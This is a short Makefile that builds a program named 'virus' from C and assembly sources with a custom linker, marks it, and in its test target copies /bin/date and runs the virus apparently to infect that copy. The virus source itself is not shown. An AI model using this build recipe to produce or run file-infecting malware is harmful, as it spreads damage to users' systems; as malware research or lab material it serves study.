CFLAGS = -Os -Wall -fno-unit-at-a-time -fomit-frame-pointer -DDEBUG

all: virus

virus.o: virus.c
	$(CC) $(CFLAGS) -c virus.c -o virus.o

stub.o: stub.s
	$(CC) -x assembler-with-cpp -c stub.s -o stub.o

ld: ld.c
	$(CC) -Os -Wall -ggdb ld.c -o ld

virus: ld stub.o virus.o
	-./ld stub.o virus.o
	-@mv a.out virus
	gcc ../set_mark.c -o set_mark
	./set_mark virus

.PHONY: all clean

clean:
	-@rm -f stub.o ld virus virus.o date set_mark dt ps

test: all
	-@cp /bin/date .; export LD_PRELOAD=/lib/libc.so.6; ./virus; ./date; unset LD_PRELOAD;
	gcc dump_table.c -o dt
	./dt ./date
